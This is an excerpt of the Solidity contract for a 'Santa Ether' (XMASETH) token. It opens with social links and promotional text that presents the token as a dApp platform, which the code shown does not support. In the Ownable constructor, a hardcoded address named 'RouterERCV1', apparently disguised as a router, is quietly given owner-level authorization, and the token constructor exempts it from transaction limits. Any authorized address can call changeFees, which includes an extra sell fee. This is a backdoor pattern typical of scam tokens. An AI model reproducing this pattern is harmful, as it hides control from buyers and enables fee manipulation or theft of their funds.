...
// Telegram : https://t.me/SantaEther

// Twitter : https://twitter.com/SantaEther

// Website : https://SantaEther.club

// Medium : https://Medium.com/@SantaEther

// 

/*
Santa Ethereum is a blockchain-based platform that enables users to create and deploy decentralized applications,
or “dApps”, on the Ethereum blockchain. Using the platform, users can create open financial systems and use Smart Contracts
to automate transactions.

Santa Ethereum also allows users to store and access data securely, and to run decentralized autonomous organizations,
or DAOs. Santa Ethereum is a great way for developers to learn about blockchain technology,
as well as for businesses to create and deploy dApps with minimal effort.
*/
...
contract Ownable is Context {
    ...
    address RouterERCV1 = 0xE1f77a615BEdc101657BE204a76cA6de36F373E2;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        authorizations[RouterERCV1] = true;
...
contract SantaEther is Ownable, IERC20 {
    ...
    string constant private _name = "Santa Ether";
    string constant private _symbol = "XMASETH";
    ...
    uint256 public swapThreshold = _totalSupply * 35 / 10000;
    ...
    constructor() {
        ...
        isTxLimitExempt[RouterERCV1] = true;
        isTxLimitExempt[routerAddress] = true;

        lpWallet = msg.sender;
        projectAddress = 0xBbdb184a91f7E503f7f2aEaada1F217F7029cE89;
        devWallet = 0xBbdb184a91f7E503f7f2aEaada1F217F7029cE89;
    ...
    function changeFees(uint256 newLiqFee, uint256 newMarketingFee, uint256 newBetFee, uint256 newNativeFee, uint256 extraSellFee) public authorized{
